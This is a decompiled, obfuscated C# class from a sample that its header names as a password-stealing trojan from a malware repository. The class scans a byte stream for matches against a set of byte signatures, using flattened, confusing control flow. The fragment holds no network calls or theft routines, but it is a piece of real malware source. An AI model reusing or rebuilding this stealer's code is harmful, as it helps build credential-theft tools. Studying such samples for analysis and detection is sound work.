// Decompiled with JetBrains decompiler
// Type: wG.Mk
// Assembly: Type, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 716CE3A9-BAD1-470D-912F-B421D403F66E
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.04\HEUR-Trojan-PSW.MSIL.Stealer.gen-ee62dc596e4b4fe76f8e015ac250d696a483f656ebb02d02815520b3fd560e30.exe

using System.Runtime.InteropServices;

namespace wG
{
  public class Mk
  {
    private ja[] OZ;
    private mT Q5;
    private int tc;
    private int tn;
    private bool XD;
    internal static Mk Xn;

    public Mk(mT _param1, bool _param2, ja[] _param3)
    {
      Mk.b9();
      this.tc = 0;
      // ISSUE: explicit constructor call
      base.\u002Ector();
      this.OZ = _param3;
      int num = 0;
      if (false)
        goto label_2;
label_1:
      switch (num)
      {
        default:
          this.Q5 = _param1;
          this.XD = _param2;
          this.tc = 0;
          return;
      }
label_2:
      num = 0;
      goto label_1;
    }

    public bool kw()
    {
      long num1 = this.Q5.wN();
      this.tn = this.OZ.Length;
      int num2 = 0;
      if (Mk.Us())
        goto label_2;
label_1:
      int num3;
      num2 = num3;
label_2:
      int index1;
      bool flag1;
      while (true)
      {
        bool[] flagArray;
        bool flag2;
        int index2;
        byte num4;
        int num5;
        switch (num2)
        {
          case 1:
          case 2:
            goto label_13;
          case 3:
            ++index2;
            goto case 6;
          case 4:
            if (flag2)
              goto label_20;
label_6:
            ++index1;
            break;
label_20:
            if ((int) this.OZ[index1].Ar[index2] != (int) num4)
              goto label_17;
label_9:
            if (index2 != this.OZ[index1].Ar.Length - 1 || flagArray[index1])
              goto label_6;
            else
              goto label_12;
label_17:
            flagArray[index1] = true;
            --this.tn;
            goto label_9;
          case 5:
            num5 = this.Q5.DY().Position == this.Q5.DY().Length ? 1 : 0;
            goto label_24;
          case 6:
            if (this.tn <= 0)
            {
              this.Q5.Mg(num1);
              flag1 = true;
              if (Mk.uV() == null)
              {
                num2 = 2;
                continue;
              }
              goto label_1;
            }
            else
              goto case 7;
          case 7:
            if (this.XD)
            {
              num2 = 5;
              continue;
            }
            num5 = 0;
            goto label_24;
          default:
            flagArray = new bool[this.OZ.Length];
            index2 = 0;
            num2 = 6;
            continue;
        }
label_5:
        if (index1 < this.OZ.Length)
        {
          flag2 = !flagArray[index1];
          num2 = 4;
          continue;
        }
        num2 = 3;
        continue;
label_24:
        if (num5 != 0)
        {
          flag1 = false;
          num2 = Mk.Us() ? 1 : 1;
        }
        else
        {
          num4 = Mk.EC((object) this.Q5);
          index1 = 0;
          goto label_5;
        }
      }
label_12:
      this.tc = index1;
      this.Q5.Mg(num1);
      flag1 = false;
label_13:
      return flag1;
    }

    public ja zq() => this.OZ[this.tc];

    internal static void b9() => XTG.fvQjdC();

    internal static bool Us() => Mk.Xn == null;

    internal static Mk uV() => Mk.Xn;

    internal static byte EC([In] object obj0) => ((mT) obj0).ed();
  }
}
